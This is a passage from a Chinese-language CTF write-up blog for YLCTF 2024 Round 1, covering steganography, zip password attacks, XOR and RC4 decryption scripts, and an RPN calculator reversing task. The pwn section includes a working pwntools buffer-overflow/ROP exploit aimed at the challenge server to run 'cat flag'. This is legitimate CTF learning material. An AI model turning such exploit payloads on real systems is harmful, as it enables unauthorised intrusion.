href="#round-1-hide_png"></a> [Round 1] hide_png</h5><p>给的图片用stegsolve来看，有点模糊但是可以看看</p><p><img src="/../../images/ylctf/2024/hide_png.png" alt="hide_png"></p><p>flag没存忘了</p><h5 id="round-1-pngorzip"><a class="markdownIt-Anchor" href="#round-1-pngorzip"></a> [Round 1] pngorzip</h5><p><img src="/../../images/ylctf/2024/pngorzip.png" alt="pngorzip"></p><p>save bin形式得到zip，010去掉114514???后面的冗杂内容进行掩码攻击得到giao，解压得到flag</p><p>YLCTF{d359d6e4-740a-49cf-83eb-5b0308f09c8c}</p><h5 id="round-1-plain_crack"><a class="markdownIt-Anchor" href="#round-1-plain_crack"></a> [Round 1] plain_crack</h5><p>尝试再写个压缩包进行明文攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">files, zfile</span>):<br>    <span class="hljs-comment"># 创建一个新的 ZIP 文件</span><br>    <span class="hljs-keyword">with</span> zipfile.ZipFile(zfile, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> zipf:<br>        <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files:<br>        <br>            zipf.write(file, os.path.basename(file), compress_type=zipfile.ZIP_DEFLATED)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    files = [<span class="hljs-string">&#x27;build.py&#x27;</span>]  <br>    zfile = <span class="hljs-string">&#x27;crack2.zip&#x27;</span><br>    create(files, zfile)<br></code></pre></td></tr></table></figure><p>pyadminzip我本地的轮子有问题就用了zipfile需要测试几次才可以进行明文攻击，等待几分钟直接解压里面有flag.docx，docx也是一种zip文件形式，改成zip里面有个图片得到flag</p><p><img src="/../../images/ylctf/2024/crack.png" alt="crack"></p><h5 id="round-1-trafficdet"><a class="markdownIt-Anchor" href="#round-1-trafficdet"></a> [Round 1] trafficdet</h5><p>是个ai模型分析，把要求告诉chatgpt上传对应的文件然后叫他按形式写出解密脚本就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> train_test_split<br><span class="hljs-keyword">from</span> sklearn.ensemble <span class="hljs-keyword">import</span> RandomForestClassifier<br><span class="hljs-keyword">from</span> sklearn.metrics <span class="hljs-keyword">import</span> accuracy_score<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_and_preprocess_data</span>(<span class="hljs-params">train_file, test_file</span>):<br>    <span class="hljs-comment"># Load training data</span><br>    train_data = pd.read_csv(train_file)<br>    train_data = train_data.dropna()<br><br>    <span class="hljs-comment"># Separate features and labels</span><br>    X = train_data.drop(columns=[<span class="hljs-string">&#x27;Label&#x27;</span>])<br>    y = train_data[<span class="hljs-string">&#x27;Label&#x27;</span>]<br><br>    <span class="hljs-comment"># Load test data</span><br>    test_data = pd.read_csv(test_file)<br><br>    <span class="hljs-keyword">return</span> X, y, test_data<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">train_model</span>(<span class="hljs-params">X_train, y_train, n_estimators=<span class="hljs-number">100</span>, random_state=<span class="hljs-number">42</span></span>):<br>    model = RandomForestClassifier(n_estimators=n_estimators, random_state=random_state)<br>    model.fit(X_train, y_train)<br>    <span class="hljs-keyword">return</span> model<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate_model</span>(<span class="hljs-params">model, X_val, y_val</span>):<br>    y_pred = model.predict(X_val)<br>    accuracy = accuracy_score(y_val, y_pred)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Model Accuracy: <span class="hljs-subst">&#123;accuracy:<span class="hljs-number">.2</span>f&#125;</span>&#x27;</span>)<br>    <span class="hljs-keyword">return</span> y_pred<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_predictions</span>(<span class="hljs-params">model, X_test</span>):<br>    <span class="hljs-keyword">return</span> model.predict(X_test)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save_results</span>(<span class="hljs-params">predictions, output_file</span>):<br>    result = pd.DataFrame(&#123;<span class="hljs-string">&#x27;Label&#x27;</span>: predictions&#125;)<br>    result.index += <span class="hljs-number">1</span>  <span class="hljs-comment"># Start index at 1</span><br>    result.index.name = <span class="hljs-string">&#x27;id&#x27;</span>  <span class="hljs-comment"># Rename index to &#x27;id&#x27;</span><br>    result.to_csv(output_file, index=<span class="hljs-literal">True</span>)  <span class="hljs-comment"># Ensure the index is saved</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># Load and preprocess data</span><br>    X, y, test_data = load_and_preprocess_data(<span class="hljs-string">&#x27;train.csv&#x27;</span>, <span class="hljs-string">&#x27;test.csv&#x27;</span>)<br><br>    <span class="hljs-comment"># Split the training data into training and validation sets</span><br>    X_train, X_val, y_train, y_val = train_test_split(X, y, test_size=<span class="hljs-number">0.1</span>, random_state=<span class="hljs-number">42</span>)<br><br>    <span class="hljs-comment"># Train the model</span><br>    model = train_model(X_train, y_train)<br><br>    <span class="hljs-comment"># Evaluate the model</span><br>    evaluate_model(model, X_val, y_val)<br><br>    <span class="hljs-comment"># Make predictions on the test data</span><br>    test_preds = make_predictions(model, test_data)<br><br>    <span class="hljs-comment"># Save the results</span><br>    save_results(test_preds, <span class="hljs-string">&#x27;result.csv&#x27;</span>)<br></code></pre></td></tr></table></figure><h5 id="round-1-whatmusic"><a class="markdownIt-Anchor" href="#round-1-whatmusic"></a> [Round 1] whatmusic</h5><p>可以发现password单独解压，010研究是图片逆转写个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>   <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> g:<br>      g.write(f.read()[::-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><p>然后导入010改文件尾，得到图片，然后还需要镜像一下，再进行在线网站的镜像处理得到password，然后进行解压</p><p><img src="/../../images/ylctf/2024/result.png" alt="result"></p><p>然后就没有思路了，给了hint也看不懂，信息收集后发现</p><p><img src="/../../images/ylctf/2024/music1.png" alt="music1"></p><p>死去的记忆痛击我，在今年的iscc里面就有一题是github上面的lyra项目转音频得到wav的题目，主要是要搭建环境，我这里用了香港的vps搭建版本ubuntu20,参考文章<a href="https://blog.csdn.net/qq_36959443/article/details/116136965">Lyra编码器基础环境搭建_lyra dajian-CSDN博客</a></p><p><img src="/../../images/ylctf/2024/music2.png" alt="music2"></p><p>环境构造搭好之后用xftp传入文件然后得到wav,多听几遍得到了flag</p><p><img src="/../../images/ylctf/2024/music3.png" alt="music3"></p><h4 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> Pwn</h4><h5 id="round-1-giaopwn"><a class="markdownIt-Anchor" href="#round-1-giaopwn"></a> [Round 1] giaopwn</h5><p><img src="/../../images/ylctf/2024/giaopwn.png" alt="giaopwn"></p><p>有nx保护</p><p>vuln有溢出点，查一下是有system和cat flag的</p><p><img src="/../../images/ylctf/2024/giaopwn2.png" alt="giaopwn2"></p><p><img src="/../../images/ylctf/2024/giao.png" alt="giao"></p><p>利用寄存器rbi放入地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;challenge.yuanloo.com&quot;</span>,<span class="hljs-number">44805</span>)<br><br>payload= <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x28</span>)+p64(<span class="hljs-number">0x400743</span>)+p64(<span class="hljs-number">0x601048</span>)+p64(<span class="hljs-number">0x4006D2</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/../../images/ylctf/2024/giao1.png" alt="giao1"></p><h4 id="re"><a class="markdownIt-Anchor" href="#re"></a> Re</h4><h5 id="round1xor"><a class="markdownIt-Anchor" href="#round1xor"></a> [round1]xor</h5><p>简单测试一下发现有upx，脱壳一下</p><p><img src="/../../images/ylctf/2024/xor.png" alt="xor"></p><p>分析一下简单的异或直接gpt梭个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">encrypted_bytes = [<br>    <span class="hljs-number">0x45</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2F</span>,<br>    <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x7D</span>,<br>    <span class="hljs-number">0x29</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x2B</span>,<br>    <span class="hljs-number">0x31</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x79</span>,<br>    <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x2A</span>,<br>    <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x1C</span><br>]<br><br><span class="hljs-comment"># 解密函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">encrypted_bytes</span>):<br>    decrypted_bytes = []<br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> encrypted_bytes:<br>        decrypted_byte = byte ^ <span class="hljs-number">0x1C</span>  <br>        decrypted_bytes.append(decrypted_byte)<br>    <span class="hljs-keyword">return</span> decrypted_bytes<br><br>decrypted_values = decrypt(encrypted_bytes)<br>decrypted_string = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(b) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> decrypted_values)<br><span class="hljs-built_in">print</span>(decrypted_string)<br></code></pre></td></tr></table></figure><h5 id="round1ezgo"><a class="markdownIt-Anchor" href="#round1ezgo"></a> [round1]ezgo</h5><p>ida看一下加密逻辑</p><p><img src="/../../images/ylctf/2024/ezgo.png" alt="ezgo"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">encrypted_bytes = [<br>    <span class="hljs-number">108</span>, <span class="hljs-number">122</span>, <span class="hljs-number">116</span>, <span class="hljs-number">108</span>, <span class="hljs-number">127</span>, <span class="hljs-number">65</span>, <span class="hljs-number">94</span>, <span class="hljs-number">90</span>, <span class="hljs-number">12</span>, <span class="hljs-number">15</span>,<br>    <span class="hljs-number">15</span>, <span class="hljs-number">120</span>, <span class="hljs-number">113</span>, <span class="hljs-number">118</span>, <span class="hljs-number">110</span>, <span class="hljs-number">34</span>, <span class="hljs-number">115</span>, <span class="hljs-number">112</span>, <span class="hljs-number">36</span>, <span class="hljs-number">101</span>,<br>    <span class="hljs-number">125</span>, <span class="hljs-number">46</span>, <span class="hljs-number">121</span>, <span class="hljs-number">47</span>, <span class="hljs-number">96</span>, <span class="hljs-number">119</span>, <span class="hljs-number">119</span>, <span class="hljs-number">53</span>, <span class="hljs-number">101</span>, <span class="hljs-number">127</span>,<br>    <span class="hljs-number">50</span>, <span class="hljs-number">101</span>, <span class="hljs-number">96</span>, <span class="hljs-number">100</span>, <span class="hljs-number">110</span>, <span class="hljs-number">59</span>, <span class="hljs-number">109</span>, <span class="hljs-number">57</span>, <span class="hljs-number">98</span>, <span class="hljs-number">56</span>,<br>    <span class="hljs-number">57</span>, <span class="hljs-number">56</span>, <span class="hljs-number">34</span><br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">encrypted</span>):<br>    decrypted = []<br>    <span class="hljs-keyword">for</span> i, byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(encrypted):<br>        decrypted_byte = byte ^ (i + <span class="hljs-number">53</span>) <br>        decrypted.append(decrypted_byte)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(decrypted)<br><br>decrypted_bytes = decrypt(encrypted_bytes)<br><span class="hljs-built_in">print</span>(decrypted_bytes.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>))<br></code></pre></td></tr></table></figure><h5 id="round1xorplus"><a class="markdownIt-Anchor" href="#round1xorplus"></a> [round1]xorplus</h5><p>ida打开分析一下是rc4的加密逻辑，没学会，一股脑把加密逻辑扔给claude帮我解密，出脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_init</span>(<span class="hljs-params">key</span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)]) + <span class="hljs-number">1300</span>) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>    <span class="hljs-keyword">return</span> S<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_crypt</span>(<span class="hljs-params">S, data</span>):<br>    i = j = <span class="hljs-number">0</span><br>    result = []<br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        k = S[(S[i] + S[j]) % <span class="hljs-number">256</span>]<br>        result.append(((byte - <span class="hljs-number">20</span>) &amp; <span class="hljs-number">0xFF</span>) ^ k)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(result)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    key = <span class="hljs-string">&quot;welcometoylctf&quot;</span><br>    encrypted_data = [<span class="hljs-number">0x91</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xec</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0xcd</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x65</span>,<br>                      <span class="hljs-number">0x3b</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x8</span>, <span class="hljs-number">0x96</span>,<br>                      <span class="hljs-number">0x84</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0xb9</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xa6</span>]<br><br>    S = rc4_init(key)<br>    decrypted = rc4_crypt(S, encrypted_data)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted message:&quot;</span>, decrypted.decode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h5 id="round-1calc"><a class="markdownIt-Anchor" href="#round-1calc"></a> [round 1]calc</h5><p>分析解密的源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;math.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Stack</span> &#123;</span><br>    <span class="hljs-type">double</span>* low;<br>    <span class="hljs-type">int</span> size;<br>    <span class="hljs-type">double</span>* top;<br>&#125; <span class="hljs-built_in">stack</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(<span class="hljs-built_in">stack</span>* s)</span> &#123;<br>    s-&gt;size = <span class="hljs-number">100</span>;<br>    s-&gt;low = (<span class="hljs-type">double</span>*)<span class="hljs-built_in">malloc</span>((<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">double</span>)) * <span class="hljs-number">100</span>);<br>    s-&gt;top = s-&gt;low;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">push</span><span class="hljs-params">(<span class="hljs-built_in">stack</span>* s, <span class="hljs-type">double</span> e)</span> &#123;<br>    *(s-&gt;top) = e;<br>    s-&gt;top++;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pop</span><span class="hljs-params">(<span class="hljs-built_in">stack</span>* s, <span class="hljs-type">double</span>* e)</span> &#123;<br>    s-&gt;top--;<br>    *e = *(s-&gt;top);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">stack</span> s;<br>    <span class="hljs-type">double</span> e, d;<br>    <span class="hljs-type">char</span> ch;<br>    <span class="hljs-type">double</span> d, e;<br>    init(&amp;s);<br>    <span class="hljs-type">char</span> num[<span class="hljs-number">100</span>];<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;input data, end of &#x27;#&#x27;&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%c&quot;</span>, &amp;ch);<br>    <br>    <span class="hljs-keyword">while</span> (ch != <span class="hljs-string">&#x27;#&#x27;</span>) &#123;<br>        <span class="hljs-keyword">while</span> (ch &gt;= <span class="hljs-string">&#x27;0&#x27;</span> &amp;&amp; ch &lt;= <span class="hljs-string">&#x27;9&#x27;</span>) &#123;<br>            num[i] = ch;<br>            i++;<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%c&quot;</span>, &amp;ch);<br>        &#125;<br>        <br>        <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27; &#x27;</span>) &#123;<br>            num[i] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>            d = atof(num);<br>            push(&amp;s, d);<br>            i = <span class="hljs-number">0</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">switch</span> (ch) &#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;+&#x27;</span>:<br>                    pop(&amp;s, &amp;d);<br>                    pop(&amp;s, &amp;e);<br>                    push(&amp;s, e + d);<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;-&#x27;</span>:<br>                    pop(&amp;s, &amp;d);<br>                    pop(&amp;s, &amp;e);<br>                    push(&amp;s, e - d);<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;*&#x27;</span>:<br>                    pop(&amp;s, &amp;d);<br>                    pop(&amp;s, &amp;e);<br>                    push(&amp;s, e * d);<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;/&#x27;</span>:<br>                    pop(&amp;s, &amp;d);<br>                    pop(&amp;s, &amp;e);<br>                    push(&amp;s, e / d);<br>                    <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%c&quot;</span>, &amp;ch);<br>        <br>        <span class="hljs-keyword">if</span> (d == <span class="hljs-number">125</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, getenv(<span class="hljs-string">&quot;GZCTF_FLAG&quot;</span>));<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>程序使用逆波兰表示法（Reverse Polish Notation，RPN）进行计算。当栈顶的值达到 125 时，程序会输出 GZCTF_FLAG。</p><p>在栈顶产生值 125。所以能在栈顶产生 125 的 RPN 表达应该是有效的输入</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">5 5 * 5 * #<br></code></pre></td></tr></table></figure><p>尝试了一些其他的没有成功这个是成功的</p><h4 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h4><h5 id="round-1-disal"><a class="markdownIt-Anchor" href="#round-1-disal"></a> [Round 1] Disal</h5><p>看不出东西，看看robots.txt，有提示去f1ag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag_is_so_beautiful.php&quot;</span>);<br><span class="hljs-variable">$a</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$key</span>=@<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-zA-Z]&#123;6&#125;/&#x27;</span>,<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$b</span>=@<span class="hljs-variable">$_REQUEST</span>[<span 